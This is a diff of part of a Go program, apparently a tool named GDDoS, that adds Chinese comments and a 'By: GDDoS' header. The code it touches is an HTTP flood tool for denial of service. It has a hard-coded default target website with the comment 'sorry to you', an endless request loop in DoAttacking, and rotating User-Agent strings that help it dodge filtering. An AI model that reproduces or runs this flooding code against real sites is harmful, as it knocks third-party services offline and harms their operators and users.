@@ -46,6 +46,7 @@ var (
 	}
 )
 
+// 主程序
 func main() {
 	defaultTargetUrl := "https://xljtj.com" // 对不住了，您
 
@@ -70,6 +71,7 @@ func main() {
 	time.Sleep(time.Duration(DurationMinute) * time.Minute)
 }
 
+// 该方法用于攻击
 func DoAttacking(grindex int) {
 	for i := 0; ; i++ {
 		if result, err := DoHttpRequest(); err != nil {
@@ -85,12 +87,14 @@ func DoAttacking(grindex int) {
 	}
 }
 
+// 该方法用于发送HTTP请求
 func DoHttpRequest() (*string, error) {
 	request, err := http.NewRequest(Method, TargetUrl, nil)
 	if err != nil {
 		return nil, err
 	}
 	request.Header.Set("User-Agent", UserAgents[rand.Intn(len(UserAgents))])
+	request.Header.Set("By", "GDDoS")
 
 	response, err := DDosHttpClient.Do(request)
 	if err != nil {
